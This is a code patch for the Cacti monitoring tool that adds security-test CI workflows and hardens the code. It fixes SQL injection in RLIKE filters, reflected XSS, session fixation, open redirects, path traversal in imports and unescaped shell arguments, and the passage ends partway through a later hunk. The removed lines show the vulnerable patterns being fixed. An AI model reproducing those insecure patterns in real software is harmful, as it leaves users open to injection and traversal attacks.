@@ -1,0 +1,3452 @@
+diff --git a/.github/workflows/oldissues.yml b/.github/workflows/oldissues.yml
+index 5cb2ab77a1..5e5d807fc5 100644
+--- a/.github/workflows/oldissues.yml
++++ b/.github/workflows/oldissues.yml
+@@ -33,7 +33,7 @@ jobs:
+   stale:
+     runs-on: ubuntu-latest
+     steps:
+-    - uses: actions/stale@v3
++    - uses: actions/stale@v9
+       with:
+         repo-token: ${{ secrets.GITHUB_TOKEN }}
+ 
+diff --git a/.github/workflows/security-docker-tests.yml b/.github/workflows/security-docker-tests.yml
+new file mode 100644
+index 0000000000..33b1b922c0
+--- /dev/null
++++ b/.github/workflows/security-docker-tests.yml
+@@ -0,0 +1,113 @@
++name: Security Docker Tests
++
++on:
++  pull_request:
++    branches: [develop]
++    paths:
++      - '.github/workflows/security-docker-tests.yml'
++      - 'docker-compose.yml'
++      - 'docker/**'
++      - 'tests/Unit/**'
++      - 'tests/tools/**'
++      - 'lib/**'
++      - 'include/global.php'
++      - 'data_input.php'
++      - 'managers.php'
++      - 'remote_agent.php'
++  workflow_dispatch:
++
++permissions:
++  contents: read
++
++concurrency:
++  group: security-docker-${{ github.event.pull_request.number || github.ref }}
++  cancel-in-progress: true
++
++jobs:
++  security-docker:
++    name: docker security test suite
++    runs-on: ubuntu-latest
++    if: ${{ github.event_name != 'pull_request' || github.event.pull_request.draft == false }}
++    timeout-minutes: 30
++
++    steps:
++      - name: Checkout
++        uses: actions/checkout@v4
++
++      - name: Setup PHP for Composer
++        uses: shivammathur/setup-php@v2
++        with:
++          php-version: '8.4'
++          extensions: intl, mysqli, pdo_mysql, mbstring, xml
++
++      - name: Install PHP dependencies
++        timeout-minutes: 8
++        run: composer install --no-interaction --prefer-dist
++
++      - name: Create test environment
++        run: |
++          cat > .env.test <<'EOF'
++          WEB_PORT=18080
++          DB_ROOT_PASSWORD=testroot
++          DB_NAME=cacti
++          DB_USER=cacti
++          DB_PASSWORD=testpass
++          DB_PORT=13306
++          TIMEZONE=UTC
++          PHP_MEMORY_LIMIT=256M
++          DB_MAX_CONNECTIONS=50
++          DB_BUFFER_POOL_SIZE=256M
++          EOF
++
++      - name: Build and start docker stack
++        timeout-minutes: 12
++        run: |
++          docker compose --env-file .env.test build --pull
++          docker compose --env-file .env.test up -d
++
++      - name: Wait for healthy containers
++        timeout-minutes: 5
++        run: |
++          set -euo pipefail
++          for _ in $(seq 1 24); do
++            DB_HEALTH=$(docker compose --env-file .env.test ps --format json | grep -o '"Health":"[^"]*"' | head -1 | cut -d'"' -f4 || true)
++            WEB_HEALTH=$(docker compose --env-file .env.test ps --format json | grep -o '"Health":"[^"]*"' | tail -1 | cut -d'"' -f4 || true)
++            if [ "$DB_HEALTH" = "healthy" ] && [ "$WEB_HEALTH" = "healthy" ]; then
++              exit 0
++            fi
++            sleep 5
++          done
++          echo "Timed out waiting for docker health"
++          docker compose --env-file .env.test ps
++          exit 1
++
++      - name: Run basic docker smoke checks
++        run: |
++          curl -fsS http://localhost:18080/cacti/ >/dev/null
++          docker compose --env-file .env.test exec -T web test -f /var/www/html/cacti/include/config.php
++          docker compose --env-file .env.test exec -T web php -r "new PDO('mysql:host=db;dbname=cacti', 'cacti', 'testpass');"
++
++      - name: Run security-focused unit suite in container
++        timeout-minutes: 8
++        run: |
++          docker compose --env-file .env.test exec -T web include/vendor/bin/pest --colors=never \
++            tests/Unit/Pr7036ReviewCoverageTest.php \
++            tests/Unit/PathValidationIntegrationTest.php \
++            tests/Unit/SecurityValidationHelpersTest.php \
++            tests/Unit/RemoteAgentAuthTest.php
++
++      - name: Collect docker logs
++        if: always()
++        run: docker compose --env-file .env.test logs --no-color > docker-security-tests.log
++
++      - name: Upload logs
++        if: always()
++        uses: actions/upload-artifact@v4
++        with:
++          name: docker-security-tests-log
++          path: docker-security-tests.log
++          if-no-files-found: ignore
++
++      - name: Tear down docker stack
++        if: always()
++        run: docker compose --env-file .env.test down -v --remove-orphans
+diff --git a/.github/workflows/syntax.yml b/.github/workflows/syntax.yml
+index f8f0bd3240..0dfccd34b2 100644
+--- a/.github/workflows/syntax.yml
++++ b/.github/workflows/syntax.yml
+@@ -54,7 +54,7 @@ jobs:
+   check:
+     runs-on: ${{ matrix.os }}
+ #    runs-on: self-hosted
+-#    container: 
++#    container:
+ #      ${{ matrix.os }}
+     strategy:
+       fail-fast: false
+@@ -107,7 +107,7 @@ jobs:
+           ${{ runner.os }}-php-
+ 
+     - name: Install dependencies
+-      run: sudo composer install 
++      run: sudo composer install
+ 
+     - name: Run Linter on base code
+       run: composer run-script lint
+@@ -182,12 +182,14 @@ jobs:
+         # With syslog we have to enable batch installs using the lines below
+         cd ${{ github.workspace }}/plugins/syslog
+         cp -p config.php.dist config.php
++        # shellcheck disable=SC2016
+         sed -i 's/\/\/\$syslog_install_options/\$syslog_install_options/g' config.php
+ 
+     - name: Move plugin config files
+       run: |
+         cp -p ${{ github.workspace }}/plugins/flowview/config.php.dist ${{ github.workspace }}/plugins/flowview/config.php
+         cp -p ${{ github.workspace }}/plugins/syslog/config.php.dist ${{ github.workspace }}/plugins/syslog/config.php
++        # shellcheck disable=SC2016
+         sed -i 's/\/\/\$/\$/g' ${{ github.workspace }}/plugins/syslog/config.php
+ 
+     - name: Run apt-get update
+@@ -213,7 +215,7 @@ jobs:
+         sudo chmod o+x /home/runner/work
+         sudo chmod o+x /home/runner/work/cacti
+         sudo chmod o+x /home/runner/work/cacti/cacti
+-      
++
+     - name: Configure Apache Site
+       run: |
+         cp ${{ github.workspace }}/tests/tools/cacti.conf /tmp/cacti.conf
+@@ -222,20 +224,20 @@ jobs:
+ 
+     - name: Restart Apache2
+       run: sudo systemctl restart apache2
+-      
++
+     - name: Create and Initialize Database
+       env:
+         MYSQL_AUTH_USR: "--defaults-file=~/.my.cnf"
+       run: |
+         echo -e "[client]\nuser = root\npassword = cactiroot\nhost = 127.0.0.1\nmax_allowed_packet = 500000000\n" >> ~/.my.cnf
+         cat ~/.my.cnf
+-        mysql $MYSQL_AUTH_USR -e "CREATE DATABASE IF NOT EXISTS cacti;"
+-        mysql $MYSQL_AUTH_USR -e "CREATE USER 'cactiuser'@'localhost' IDENTIFIED BY 'cactiuser';"
+-        mysql $MYSQL_AUTH_USR -e "GRANT ALL PRIVILEGES ON cacti.* TO 'cactiuser'@'localhost';"
+-        mysql $MYSQL_AUTH_USR -e "FLUSH PRIVILEGES;"
+-        mysql $MYSQL_AUTH_USR -e "SET GLOBAL max_allowed_packet=500000000;"
+-        mysql $MYSQL_AUTH_USR cacti < ${{ github.workspace }}/cacti.sql
+-        mysql $MYSQL_AUTH_USR -e "INSERT INTO settings (name, value) VALUES ('path_php_binary', '/bin/php')" cacti
++        mysql "$MYSQL_AUTH_USR" -e "CREATE DATABASE IF NOT EXISTS cacti;"
++        mysql "$MYSQL_AUTH_USR" -e "CREATE USER 'cactiuser'@'localhost' IDENTIFIED BY 'cactiuser';"
++        mysql "$MYSQL_AUTH_USR" -e "GRANT ALL PRIVILEGES ON cacti.* TO 'cactiuser'@'localhost';"
++        mysql "$MYSQL_AUTH_USR" -e "FLUSH PRIVILEGES;"
++        mysql "$MYSQL_AUTH_USR" -e "SET GLOBAL max_allowed_packet=500000000;"
++        mysql "$MYSQL_AUTH_USR" cacti < ${{ github.workspace }}/cacti.sql
++        mysql "$MYSQL_AUTH_USR" -e "INSERT INTO settings (name, value) VALUES ('path_php_binary', '/bin/php')" cacti
+ 
+     - name: Prime Cacti config.php File
+       run: |
+@@ -268,7 +270,8 @@ jobs:
+         sudo php tests/tools/check_xml_syntax.php
+ 
+     - name: Check Poller Script Syntax after Package Import
+-      run: 
++      run: |
++        # shellcheck disable=SC2091,SC2227
+         if $(find ${{ github.workspace }}/scripts -name '*.php' -exec php -l {} 2>&1 \; | grep -iv "no syntax errors detected"); then exit 1; fi
+ 
+     - name: Check that all CLI scripts have a valid --version flag
+@@ -290,10 +293,11 @@ jobs:
+       run: |
+         cd ${{ github.workspace }}
+         sudo php tests/tools/check_xml_syntax.php
+-    
++
+     - name: Check all perl scripts for syntax errors
+       run: |
+         cd ${{ github.workspace }}
++        # shellcheck disable=SC2091,SC2227
+         if $(find scripts -name '*.pl' -exec perl -c {} 2>&1 \; | grep -iv "syntax OK"); then exit 1; fi
+ 
+     - name: Audit the Installation Schema
+@@ -316,6 +320,7 @@ jobs:
+     - name: Run Cacti poller
+       run: |
+         sudo php ${{ github.workspace }}/poller.php --poller=1 --force --debug
++        # shellcheck disable=SC2091
+         if ! $(grep -q "SYSTEM STATS" ${{ github.workspace }}/log/cacti.log); then exit 1; fi
+ 
+     - name: Check All Pages Using Recursive wget
+diff --git a/.github/workflows/workflow-lint.yml b/.github/workflows/workflow-lint.yml
+new file mode 100644
+index 0000000000..0161f2232d
+--- /dev/null
++++ b/.github/workflows/workflow-lint.yml
+@@ -0,0 +1,34 @@
++name: Workflow Lint
++
++on:
++  pull_request:
++    branches: [develop]
++    paths:
++      - '.github/workflows/**'
++  workflow_dispatch:
++
++permissions:
++  contents: read
++
++concurrency:
++  group: workflow-lint-${{ github.event.pull_request.number || github.ref }}
++  cancel-in-progress: true
++
++jobs:
++  lint-workflows:
++    name: actionlint + yamllint
++    runs-on: ubuntu-latest
++    timeout-minutes: 10
++
++    steps:
++      - name: Checkout
++        uses: actions/checkout@v4
++
++      - name: Run actionlint
++        run: docker run --rm -v "$PWD":/repo -w /repo rhysd/actionlint:1.7.8
++
++      - name: Install yamllint
++        run: python3 -m pip install --user yamllint
++
++      - name: Run yamllint on workflows
++        run: ~/.local/bin/yamllint .github/workflows
+diff --git a/.yamllint.yml b/.yamllint.yml
+new file mode 100644
+index 0000000000..93f8d83cbe
+--- /dev/null
++++ b/.yamllint.yml
+@@ -0,0 +1,20 @@
++---
++extends: default
++rules:
++  line-length:
++    max: 200
++    level: warning
++  document-start: disable
++  truthy:
++    allowed-values: ['true', 'false', 'on', 'off', 'yes', 'no']
++    level: warning
++  comments:
++    min-spaces-from-content: 1
++  comments-indentation: disable
++  indentation:
++    spaces: 2
++    indent-sequences: whatever
++  brackets:
++    min-spaces-inside: 0
++    max-spaces-inside: 1
++  trailing-spaces: enable
+diff --git a/aggregate_graphs.php b/aggregate_graphs.php
+index 70f1c6e0e3..88ccd465c9 100644
+--- a/aggregate_graphs.php
++++ b/aggregate_graphs.php
+@@ -1575,7 +1575,7 @@ function aggregate_items() : void {
+ 	if (grv('rfilter') == '') {
+ 		$sql_where = '';
+ 	} elseif (validate_is_regex(grv('rfilter'))) {
+-		$sql_where = "WHERE gtg.title_cache RLIKE '" . grv('rfilter') . "'";
++		$sql_where = 'WHERE gtg.title_cache ' . db_qstr_rlike(grv('rfilter'));
+ 	} else {
+ 		$filters   = explode(' ', grv('rfilter'));
+ 		$sql_where = '';
+@@ -1697,7 +1697,7 @@ function clearFilter() {
+ 							<?php print __('Search'); ?>
+ 						</td>
+ 						<td>
+-							<input type='text' class='ui-state-default ui-corner-all' id='rfilter' size='45' onChange='applyFilter()' value='<?php print grv('rfilter'); ?>'>
++							<input type='text' class='ui-state-default ui-corner-all' id='rfilter' size='45' onChange='applyFilter()' value='<?php print htmlerv('rfilter'); ?>'>
+ 						</td>
+ 						<td>
+ 							<?php print __('Graphs'); ?>
+diff --git a/auth_changepassword.php b/auth_changepassword.php
+index d7076eadd0..2ecbe1db72 100644
+--- a/auth_changepassword.php
++++ b/auth_changepassword.php
+@@ -55,8 +55,15 @@
+ 
+ if (basename($return) != 'auth_changepassword.php') {
+ 	if (strpos($return, '/plugins/') !== false) {
+-		$parts  = explode('/plugins/', $return);
+-		$return = CACTI_PATH_URL . 'plugins/' . $parts[1];
++		$parts       = explode('/plugins/', $return);
++		$plugin_path = $parts[1] ?? '';
++		$plugin_path = ltrim(explode('?', $plugin_path, 2)[0], '/');
++
++		if ($plugin_path === '' || preg_match('#(^|/)\.\.(/|$)#', $plugin_path)) {
++			$return = CACTI_PATH_URL . 'index.php';
++		} else {
++			$return = CACTI_PATH_URL . 'plugins/' . $plugin_path;
++		}
+ 	} else {
+ 		$return = CACTI_PATH_URL . basename($return);
+ 	}
+diff --git a/auth_login.php b/auth_login.php
+index 16d5d66562..59041102e1 100644
+--- a/auth_login.php
++++ b/auth_login.php
+@@ -201,6 +201,9 @@
+ 		}
+ 
+ 		if (!$error) {
++			// rotate session ID to prevent session fixation
++			session_regenerate_id(true);
++
+ 			// set the php session
+ 			$_SESSION[SESS_USER_ID]     = $user['id'];
+ 			$_SESSION[SESS_USER_AGENT]  = $_SERVER['HTTP_USER_AGENT'];
+diff --git a/data_input.php b/data_input.php
+index 169d474e11..014dbdf767 100644
+--- a/data_input.php
++++ b/data_input.php
+@@ -98,6 +98,16 @@ function form_save() : void {
+ 		$save['input_string'] = form_input_validate(gnrv('input_string'), 'input_string', '', true, 3);
+ 		$save['type_id']      = form_input_validate(gnrv('type_id'), 'type_id', '^[0-9]+$', true, 3);
+ 
++		// Reject shell metacharacters outside of <placeholder> markers to prevent command injection.
++		// Pipes are intentionally allowed for common command chaining.
++		if (!is_error_message()) {
++			if (!cacti_input_string_is_safe($save['input_string'])) {
++				raise_message('validation_error', __('Input string contains dangerous shell characters'), MESSAGE_LEVEL_ERROR);
++				header('Location: data_input.php?action=edit&id=' . (empty($save['id']) ? '' : $save['id']));
++				exit;
++			}
++		}
++
+ 		if (!is_error_message()) {
+ 			$data_input_id = sql_save($save, 'data_input');
+ 
+@@ -108,7 +118,7 @@ function form_save() : void {
+ 				if (!ierv('id')) {
+ 					db_execute_prepared('UPDATE data_input_fields SET sequence = 0 WHERE data_input_id = ?', [gnrv('id')]);
+ 
+-					generate_data_input_field_sequences(gnrv('input_string'), gnrv('id'));
++					generate_data_input_field_sequences($save['input_string'], $data_input_id);
+ 
+ 					update_replication_crc(0, 'poller_replicate_data_input_fields_crc');
+ 				}
+diff --git a/docker-compose.yml b/docker-compose.yml
+index a39b735eef..b9a2d19cc4 100644
+--- a/docker-compose.yml
++++ b/docker-compose.yml
+@@ -12,7 +12,6 @@ services:
+     build:
+       context: .
+       dockerfile: docker/Dockerfile
+-    container_name: cacti_web
+     ports:
+       - "${WEB_PORT:-8080}:80"
+     volumes:
+@@ -36,7 +35,6 @@ services:
+ 
+   db:
+     image: mariadb:11.8
+-    container_name: cacti_db
+     environment:
+       MYSQL_ROOT_PASSWORD: ${DB_ROOT_PASSWORD:-root}
+       MYSQL_DATABASE: ${DB_NAME:-cacti}
+diff --git a/include/auth.php b/include/auth.php
+index 6347011a19..768face2dd 100644
+--- a/include/auth.php
++++ b/include/auth.php
+@@ -83,6 +83,7 @@
+ 		$cookie_user = check_auth_cookie();
+ 
+ 		if ($cookie_user !== false) {
++			session_regenerate_id(true);
+ 			$_SESSION[SESS_USER_ID]     = $cookie_user;
+ 			$_SESSION[SESS_USER_AGENT]  = $_SERVER['HTTP_USER_AGENT'];
+ 			$_SESSION[SESS_CLIENT_ADDR] = get_client_addr();
+diff --git a/include/global.php b/include/global.php
+index 572607b1f4..9e374845c2 100644
+--- a/include/global.php
++++ b/include/global.php
+@@ -272,6 +272,7 @@
+ // include base modules
+ require_once(CACTI_PATH_LIBRARY . '/database.php');
+ require_once(CACTI_PATH_LIBRARY . '/functions.php');
++require_once(CACTI_PATH_LIBRARY . '/security_validation.php');
+ require_once(CACTI_PATH_INCLUDE . '/global_constants.php');
+ 
+ define('CACTI_VERSION', format_cacti_version($cacti_version, CACTI_VERSION_FORMAT_SHORT));
+diff --git a/lib/api_automation.php b/lib/api_automation.php
+index c339bc4e92..6ca436fdfd 100644
+--- a/lib/api_automation.php
++++ b/lib/api_automation.php
+@@ -752,12 +752,16 @@ function automation_get_new_graphs_sql(array $rule) : mixed {
+ 		'sort_column' => [
+ 			'filter'  => FILTER_CALLBACK,
+ 			'default' => 'description',
+-			'options' => ['options' => 'sanitize_search_string']
++			'options' => ['options' => function ($v) {
++				return cacti_validate_sort_column($v, 'description');
++			}]
+ 		],
+ 		'sort_direction' => [
+ 			'filter'  => FILTER_CALLBACK,
+ 			'default' => 'ASC',
+-			'options' => ['options' => 'sanitize_search_string']
++			'options' => ['options' => function ($v) {
++				return cacti_validate_sort_direction($v, 'ASC');
++			}]
+ 		]
+ 	];
+ 
+diff --git a/lib/auth.php b/lib/auth.php
+index a1812aac45..95def0dd89 100644
+--- a/lib/auth.php
++++ b/lib/auth.php
+@@ -3577,7 +3577,21 @@ function auth_process_lockout(string $username, int $realm) : void {
+ 					$error_msg = __('Access Denied!  Login Disabled.');
+ 				}
+ 
+-				$failed = intval($user['failed_attempts']) + 1;
++				// Atomic increment to prevent TOCTOU race on lockout counter
++				db_execute_prepared("UPDATE user_auth
++					SET lastfail = ?, failed_attempts = failed_attempts + 1
++					WHERE username = ?
++					AND realm = ?
++					AND enabled = 'on'",
++					[time(), $username, $realm]);
++
++				$user = db_fetch_row_prepared('SELECT failed_attempts, locked
++					FROM user_auth
++					WHERE username = ?
++					AND realm = ?',
++					[$username, $realm]);
++
++				$failed = $user['failed_attempts'];
+ 
+ 				cacti_log(sprintf('LOGIN FAILED: User \'%s\' failed authentication, incrementing lockout (%d of %d)',$username, $failed, $max), false, 'AUTH', POLLER_VERBOSITY_LOW);
+ 
+@@ -3592,15 +3606,6 @@ function auth_process_lockout(string $username, int $realm) : void {
+ 					$user['locked'] = 'on';
+ 				}
+ 
+-				$user['lastfail'] = time();
+-
+-				db_execute_prepared("UPDATE user_auth
+-					SET lastfail = ?, failed_attempts = ?
+-					WHERE username = ?
+-					AND realm = ?
+-					AND enabled = 'on'",
+-					[$user['lastfail'], $failed, $username, $realm]);
+-
+ 				// Log the invalid password attempt
+ 				db_execute_prepared('INSERT IGNORE INTO user_log
+ 					(username, user_id, result, ip, time)
+@@ -4565,7 +4570,7 @@ function auth_login_redirect(string $login_opts = '') : void {
+ 
+ 				cacti_log(sprintf("DEBUG: Referer from REDIRECT_URL with Value: '%s', Effective: '%s'", $_SERVER['REDIRECT_URL'], $referer), false, 'AUTH', POLLER_VERBOSITY_DEBUG);
+ 			} elseif (isset($_SERVER['HTTP_REFERER'])) {
+-				$referer = $_SERVER['HTTP_REFERER'];
++				$referer = validate_redirect_url($_SERVER['HTTP_REFERER']);
+ 
+ 				if (auth_basename($referer) == 'logout.php') {
+ 					$referer = CACTI_PATH_URL . 'index.php';
+diff --git a/lib/boost.php b/lib/boost.php
+index bb5a107fc4..8ef59355ff 100644
+--- a/lib/boost.php
++++ b/lib/boost.php
+@@ -1844,10 +1844,10 @@ function boost_poller_bottom() : void {
+ 		if ($boost_debug && $boost_log != '') {
+ 			if (CACTI_SERVER_OS == 'unix') {
+ 				$extra_args    = '-q ' . CACTI_PATH_BASE . '/poller_boost.php --debug';
+-				$redirect_args =  '>> ' . $boost_log . ' 2>&1';
++				$redirect_args = '>> ' . cacti_escapeshellarg($boost_log) . ' 2>&1';
+ 			} else {
+ 				$extra_args    = '-q ' . CACTI_PATH_BASE . '/poller_boost.php --debug';
+-				$redirect_args = '>> ' . $boost_log;
++				$redirect_args = '>> ' . cacti_escapeshellarg($boost_log);
+ 			}
+ 		} else {
+ 			$extra_args = '-q ' . CACTI_PATH_BASE . '/poller_boost.php';
+diff --git a/lib/database.php b/lib/database.php
+index a83fc15bd7..0875cc9adc 100644
+--- a/lib/database.php
++++ b/lib/database.php
+@@ -2223,6 +2223,10 @@ function db_qstr(mixed $s, mixed $db_conn = false) : string {
+ 	return "'" . $s . "'";
+ }
+ 
++function db_qstr_rlike(string $s, mixed $db_conn = false) : string {
++	return 'RLIKE ' . db_qstr($s, $db_conn);
++}
++
+ /**
+  * db_strip_control_chars - Strip control characters from SQL command
+  *
+diff --git a/lib/functions.php b/lib/functions.php
+index 236888e76d..4fbb99817c 100644
+--- a/lib/functions.php
++++ b/lib/functions.php
+@@ -5182,6 +5182,83 @@ function sanitize_unserialize_selected_items(mixed $items) : mixed {
+ 	return $return_items;
+ }
+ 
++function validate_path_within(string $filename, string $base_dir) : string|false {
++	if (str_contains($filename, "\0")) {
++		return false;
++	}
++
++	// Enforce leaf filenames only; do not normalize potentially hostile input.
++	if (str_contains($filename, '/') || str_contains($filename, '\\')) {
++		return false;
++	}
++
++	if ($filename === '' || $filename === '.' || $filename === '..') {
++		return false;
++	}
++
++	$base_real = realpath($base_dir);
++
++	if ($base_real === false) {
++		return false;
++	}
++
++	$combined = $base_real . '/' . $filename;
++	$resolved = realpath($combined);
++
++	// Existing file case: ensure realpath resolves within base (symlink-safe).
++	if ($resolved !== false) {
++		if (!str_starts_with($resolved, $base_real . '/') && $resolved !== $base_real) {
++			return false;
++		}
++
++		return $resolved;
++	}
++
++	// New file case: allow a safe path under base for write/create operations.
++	return $combined;
++}
++
++function validate_relative_path_within(string $path, string $base_dir) : string|false {
++	if ($path === '' || $path[0] === '/' || str_contains($path, "\0")) {
++		return false;
++	}
++
++	// Reject traversal on both Unix and Windows separators
++	foreach (preg_split('/[\/\\\\]/', $path) as $part) {
++		if ($part === '..') {
++			return false;
++		}
++	}
++
++	$base_real = realpath($base_dir);
++
++	if ($base_real === false) {
++		return false;
++	}
++
++	$combined = $base_real . '/' . $path;
++	$resolved = realpath($combined);
++
++	// If the file exists, verify it resolves within the base (catches symlinks)
++	if ($resolved !== false) {
++		if (!str_starts_with($resolved, $base_real . '/')) {
++			return false;
++		}
++
++		return $resolved;
++	}
++
++	// File doesn't exist yet (write case). Verify the parent directory
++	// resolves within the base to guard against symlink escapes.
++	$parent_real = realpath(dirname($combined));
++
++	if ($parent_real !== false && !str_starts_with($parent_real, $base_real . '/') && $parent_real !== $base_real) {
++		return false;
++	}
++
++	return $combined;
++}
++
+ /**
+  * verifies all selected graphs only contain numeric and string values
+  *
+@@ -6915,7 +6992,7 @@ function CactiErrorHandler(int $level, string $message, string $file, int $line,
+ 			cacti_debug_backtrace('PHP ERROR NOTICE', false, true, 0, 1);
+ 
+ 			break;
+-		case E_STRICT:
++		case 2048: // E_STRICT (deprecated constant in newer PHP)
+ 			cacti_log($error, false, 'ERROR');
+ 			cacti_debug_backtrace('PHP ERROR STRICT', false, true, 0, 1);
+ 
+@@ -6943,7 +7020,7 @@ function CactiShutdownHandler() : bool {
+ 		E_USER_ERROR         => 'USER_ERROR',
+ 		E_USER_WARNING       => 'USER_WARNING',
+ 		E_USER_NOTICE        => 'USER_NOTICE',
+-		E_STRICT             => 'STRICT',
++		2048                 => 'STRICT', // E_STRICT
+ 		E_RECOVERABLE_ERROR  => 'RECOVERABLE_ERROR',
+ 		E_DEPRECATED         => 'DEPRECATED',
+ 		E_USER_DEPRECATED    => 'USER_DEPRECATED',
+diff --git a/lib/html_filter.php b/lib/html_filter.php
+index d77d8e0c19..e0050b9b43 100644
+--- a/lib/html_filter.php
++++ b/lib/html_filter.php
+@@ -963,7 +963,9 @@ private function sanitize_filter_variables() : void {
+ 			$filters['sort_column']['default']    = $this->filter_array['sort']['sort_column'];
+ 
+ 			$filters['sort_direction']['filter']  = FILTER_CALLBACK;
+-			$filters['sort_direction']['options'] = ['options' => 'sanitize_search_string'];
++			$filters['sort_direction']['options'] = ['options' => function ($v) {
++				return cacti_validate_sort_direction($v, 'ASC');
++			}];
+ 			$filters['sort_direction']['default'] = $this->filter_array['sort']['sort_direction'];
+ 		}
+ 
+diff --git a/lib/html_graph.php b/lib/html_graph.php
+index e5797b1cb3..62ff652de7 100644
+--- a/lib/html_graph.php
++++ b/lib/html_graph.php
+@@ -855,7 +855,7 @@ function html_graph_preview_view() : void {
+ 	$sql_where  = '';
+ 
+ 	if (!ierv('rfilter')) {
+-		$sql_where .= " gtg.title_cache RLIKE '" . grv('rfilter') . "'";
++		$sql_where .= ' gtg.title_cache ' . db_qstr_rlike(grv('rfilter'));
+ 	}
+ 
+ 	$sql_where .= ($sql_or != '' && $sql_where != '' ? ' AND ' : '') . $sql_or;
+@@ -1231,7 +1231,7 @@ function html_graph_list_view() : void {
+ 	$sql_where  = '';
+ 
+ 	if (!ierv('rfilter')) {
+-		$sql_where .= " gtg.title_cache RLIKE '" . grv('rfilter') . "'";
++		$sql_where .= ' gtg.title_cache ' . db_qstr_rlike(grv('rfilter'));
+ 	}
+ 
+ 	if (!ierv('site_id') && grv('site_id') > 0) {
+diff --git a/lib/html_reports.php b/lib/html_reports.php
+index aed5aa6ece..9dfb0bc589 100644
+--- a/lib/html_reports.php
++++ b/lib/html_reports.php
+@@ -271,7 +271,15 @@ function reports_form_save() : void {
+ 		if (ierv('id')) {
+ 			$save['user_id'] = $_SESSION[SESS_USER_ID];
+ 		} else {
+-			$save['user_id'] = db_fetch_cell_prepared('SELECT user_id FROM reports WHERE id = ?', [$post['id']]);
++			$owner_id = db_fetch_cell_prepared('SELECT user_id FROM reports WHERE id = ?', [$post['id']]);
++
++			if ($owner_id != $_SESSION[SESS_USER_ID] && !is_realm_allowed(21)) {
++				raise_message('permission_denied');
++				header('Location: reports.php');
++				exit;
++			}
++
++			$save['user_id'] = $owner_id;
+ 		}
+ 
+ 		$save['id']            = $post['id'];
+@@ -280,7 +288,7 @@ function reports_form_save() : void {
+ 		$save['enabled']       = (isset($post['enabled']) ? 'on' : '');
+ 
+ 		$save['cformat']       = (isset($post['cformat']) ? 'on' : '');
+-		$save['format_file']   = $post['format_file'];
++		$save['format_file']   = basename($post['format_file']);
+ 		$save['font_size']     = form_input_validate($post['font_size'], 'font_size', '^[0-9]+$', false, 3);
+ 		$save['alignment']     = form_input_validate($post['alignment'], 'alignment', '^[0-9]+$', false, 3);
+ 		$save['graph_linked']  = (isset($post['graph_linked']) ? 'on' : '');
+@@ -415,9 +423,22 @@ function reports_form_actions() : void {
+ 
+ 				$report_id = intval($report_id);
+ 
++				// Verify ownership before any mutation
++				if ($type == 'reports') {
++					$owner_id = db_fetch_cell_prepared('SELECT user_id FROM reports WHERE id = ?', [$report_id]);
++
++					if ($owner_id != $_SESSION[SESS_USER_ID] && !is_realm_allowed(21)) {
++						continue;
++					}
++				}
++
+ 				if (gnrv('drp_action') == REPORTS_DELETE) { // delete
+ 					if ($type == 'reports') {
+-						db_execute_prepared('DELETE FROM reports WHERE id = ?', [$report_id]);
++						if (is_realm_allowed(21)) {
++							db_execute_prepared('DELETE FROM reports WHERE id = ?', [$report_id]);
++						} else {
++							db_execute_prepared('DELETE FROM reports WHERE id = ? AND user_id = ?', [$report_id, $_SESSION[SESS_USER_ID]]);
++						}
+ 						db_execute_prepared('DELETE FROM reports_items WHERE report_id = ?', [$report_id]);
+ 					} elseif ($type == 'reportit') {
+ 						if (function_exists('api_reportit_delete_report')) {
+diff --git a/lib/html_tree.php b/lib/html_tree.php
+index 624a550168..ad2ea189d0 100644
+--- a/lib/html_tree.php
++++ b/lib/html_tree.php
+@@ -1429,7 +1429,7 @@ function initPage() {
+ 		$sql_where = '';
+ 
+ 		if (grv('rfilter') != '') {
+-			$sql_where .= " (gtg.title_cache RLIKE '" . grv('rfilter') . "' OR gtg.title RLIKE '" . grv('rfilter') . "')";
++			$sql_where .= ' (gtg.title_cache ' . db_qstr_rlike(grv('rfilter')) . ' OR gtg.title ' . db_qstr_rlike(grv('rfilter')) . ')';
+ 		}
+ 
+ 		if (isrv('graph_template_id') && grv('graph_template_id') != '' && grv('graph_template_id') != -1) {
+@@ -1486,7 +1486,7 @@ function initPage() {
+ 		}
+ 
+ 		if (grv('rfilter') != '') {
+-			$sql_where .= ($sql_where != '' ? ' AND ' : '') . "(gtg.title_cache RLIKE '" . grv('rfilter') . "')";
++			$sql_where .= ($sql_where != '' ? ' AND ' : '') . '(gtg.title_cache ' . db_qstr_rlike(grv('rfilter')) . ')';
+ 		}
+ 
+ 		if (isrv('graph_template_id') && grv('graph_template_id') != '') {
+@@ -1637,7 +1637,7 @@ function get_host_graph_list(int $host_id, int $graph_template_id, int $data_que
+ 			$sql_where = '';
+ 
+ 			if (grv('rfilter') != '') {
+-				$sql_where .= " (gtg.title_cache RLIKE '" . grv('rfilter') . "')";
++				$sql_where .= ' (gtg.title_cache ' . db_qstr_rlike(grv('rfilter')) . ')';
+ 			}
+ 
+ 			if ($host_id > 0) {
+@@ -1721,7 +1721,7 @@ function get_host_graph_list(int $host_id, int $graph_template_id, int $data_que
+ 				$sfd = get_formatted_data_query_indexes($host_id, $data_query['id']);
+ 
+ 				if (grv('rfilter') != '') {
+-					$sql_where = " (gtg.title_cache RLIKE '" . grv('rfilter') . "')";
++					$sql_where = ' (gtg.title_cache ' . db_qstr_rlike(grv('rfilter')) . ')';
+ 				}
+ 
+ 				// grab a list of all graphs for this host/data query combination
+diff --git a/lib/import.php b/lib/import.php
+index 2e77249066..d1067b638b 100644
+--- a/lib/import.php
++++ b/lib/import.php
+@@ -653,7 +653,16 @@ function import_package(string $xmlfile, int $profile_id = 1, bool $remove_orpha
+ 		$name  = $f['name'];
+ 
+ 		if (str_contains($name, 'scripts/') || str_contains($name, 'resource/')) {
+-			$filename = CACTI_PATH_BASE . "/$name";
++			$validated = validate_relative_path_within($name, CACTI_PATH_BASE);
++
++			if ($validated === false) {
++				cacti_log('SECURITY: Path traversal rejected in import: ' . $name, true, 'IMPORT');
++				$filestatus[$name] = __('path traversal rejected');
++
++				continue;
++			}
++
++			$filename = $validated;
+ 
+ 			if (!$preview) {
+ 				if (!cacti_sizeof($import_files) || in_array($name, $import_files, true)) {
+diff --git a/lib/ping.php b/lib/ping.php
+index 9e0fc491d7..1460765147 100644
+--- a/lib/ping.php
++++ b/lib/ping.php
+@@ -738,11 +738,11 @@ function ping(int $avail_method = AVAIL_SNMP_AND_PING, int $ping_type = PING_ICM
+ 		$this->restore_cacti_error_handler();
+ 
+ 		return match ($avail_method) {
+-			AVAIL_SNMP_OR_PING  => $snmp_result || $ping_result,
